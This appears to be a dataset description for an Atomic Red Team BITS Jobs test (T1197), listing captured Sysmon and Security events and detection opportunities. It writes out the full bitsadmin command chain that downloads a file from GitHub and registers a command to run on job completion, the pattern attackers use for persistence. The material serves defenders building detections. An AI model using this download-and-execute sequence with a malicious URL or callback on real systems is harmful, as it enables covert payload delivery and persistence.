# T1197-3: BITS Jobs — Persist, Download, & Execute

## Technique Context

Background Intelligent Transfer Service (BITS) is a Windows feature designed for asynchronous, bandwidth-throttled file transfers that survive reboots and network interruptions. Adversaries abuse BITS for defense evasion and persistence because transfers appear as legitimate system activity, run under the svchost.exe process tree, survive system restarts, and can trigger arbitrary commands on completion via notification callbacks. The specific capability abused here — `bitsadmin /setnotifycmdline` — lets an attacker execute any binary when a BITS job completes, providing a clean persistence mechanism that requires no new service installations or scheduled task entries.

This technique is well-documented in APT campaigns for payload delivery and establishing footholds that survive endpoint reboots. Detection programs focus on `bitsadmin.exe` invocations with suspicious arguments, BITS job creation events, network connections to unusual destinations from the BITS service context, and notification command registrations pointing outside the expected system paths.

## What This Dataset Contains

This dataset captures the complete BITS job lifecycle as executed without endpoint defenses. Security EID 4688 and Sysmon EID 1 together document five distinct `bitsadmin.exe` process creations run as `NT AUTHORITY\SYSTEM`:

1. `bitsadmin.exe /create AtomicBITS` — job creation
2. `bitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Windows\TEMP\bitsadmin3_flag.ps1` — URL and destination registration
3. `bitsadmin.exe /setnotifycmdline AtomicBITS C:\Windows\system32\notepad.exe NULL` — notification command registration
4. `bitsadmin.exe /resume AtomicBITS` — job activation
5. `bitsadmin.exe /complete AtomicBITS` — job completion

These five invocations are each tagged by Sysmon's rule engine with `technique_id=T1197,technique_name=BITS Jobs` on the creation events.

The full compound invocation is visible in Sysmon EID 1 as the cmd.exe command line: `"cmd.exe" /c bitsadmin.exe /create AtomicBITS & bitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\bitsadmin3_flag.ps1 & bitsadmin.exe /setnotifycmdline AtomicBITS C:\Windows\system32\notepad.exe NULL & bitsadmin.exe /resume AtomicBITS & ping -n 5 127.0.0.1 >nul 2>&1 & bitsadmin.exe /complete AtomicBITS`.

Sysmon EID 3 captures a network connection from the BITS service context, and Sysmon EID 22 shows the DNS resolution for `raw.githubusercontent.com` that precedes the actual download. Sysmon EID 7 records BitsProxy.dll loading into each bitsadmin process, confirming the BITS functionality was actually engaged (not just a command-line pass-through). Sysmon EID 11 records a temporary file created by `svchost.exe` at `C:\Windows\Temp\BITB4C0.tmp`, which is the BITS service's working file during the download. A cleanup `cmd.exe /c del %temp%\bitsadmin3_flag.ps1 >nul 2>&1` is also captured in both Security 4688 and Sysmon EID 1.

The Security channel contributes 35 events: 11 EID 4688 (process creation), 5 EID 4798 (local group membership enumeration), and 19 EID 4799 (security-enabled group enumeration) events. The PowerShell channel records 107 events (104 EID 4104 script blocks, 3 EID 4103 module events) documenting the ART test framework execution context, including `Set-ExecutionPolicy Bypass -Scope Process -Force` and the `$ErrorActionPreference = 'Continue'` test framework setup.

## What This Dataset Does Not Contain

The notification callback command (`notepad.exe`) does not appear in the process creation events, which is expected given that the cleanup step explicitly deletes the downloaded file and completes the BITS job before notepad would typically fire. In a real-world scenario where the notification callback was a malicious payload, you would expect an additional EID 1 / EID 4688 showing that binary spawning from the BITS service context.

No Sysmon EID 5 (process terminated) events are included in this dataset configuration. The dataset does not include BITS-specific operational event log data from `Microsoft-Windows-Bits-Client/Operational`, which would provide the BITS job GUID, creation, and transfer completion events — a valuable additional data source for hunting this technique that is not part of this collection.

There is no AMSI or Windows Defender telemetry present because defenses were disabled for this run.

## Assessment

Compared to the defended variant of this dataset (Sysmon: 31, Security: 22, PowerShell: 35 events), this undefended dataset is meaningfully larger: Sysmon grows to 37 events, Security to 35, and PowerShell to 107. The most important difference is the PowerShell channel: the defended dataset captures only 35 script block events because Defender's AMSI integration truncates execution early; the undefended dataset captures the full test framework execution with 104 EID 4104 script blocks. The Sysmon data is largely equivalent — the technique-specific bitsadmin process creations are present in both, confirming that the core BITS abuse artifacts are detectable regardless of Defender status.

This dataset is particularly valuable because it shows the complete five-phase BITS job lifecycle with each phase producing its own EID 1 / EID 4688 event, making the enumeration of BITS operations straightforward. The combination of the network DNS query (EID 22) for `raw.githubusercontent.com`, the svchost.exe temporary file (EID 11), and the bitsadmin command sequence creates a multi-source corroboration chain that is difficult for an attacker to break without abandoning the technique entirely.

## Detection Opportunities Present in This Data

- **Sysmon EID 1 / Security EID 4688**: `bitsadmin.exe` processes with `/create`, `/addfile`, `/setnotifycmdline`, `/resume`, and `/complete` arguments in rapid succession from a PowerShell parent process, running as `NT AUTHORITY\SYSTEM` with `Creator Process Name` pointing to `powershell.exe`
- **Sysmon EID 7**: `BitsProxy.dll` loading into `bitsadmin.exe` processes confirms actual BITS API engagement rather than purely decorative command-line logging
- **Sysmon EID 22**: DNS resolution for external domains (here `raw.githubusercontent.com`) by `svchost.exe` or in temporal proximity to bitsadmin invocations
- **Sysmon EID 11**: Temporary files at paths like `C:\Windows\Temp\BIT*.tmp` created by `svchost.exe` (PID corresponding to the BITS service) indicate an in-progress transfer
- **Sysmon EID 3**: Network connection from the BITS service context to an external IP immediately following a `bitsadmin /resume` invocation
- **Security EID 4688**: The `/setnotifycmdline` argument combined with a path outside `%SystemRoot%\System32\` is a high-fidelity indicator that a BITS notification callback has been configured to execute potentially malicious content
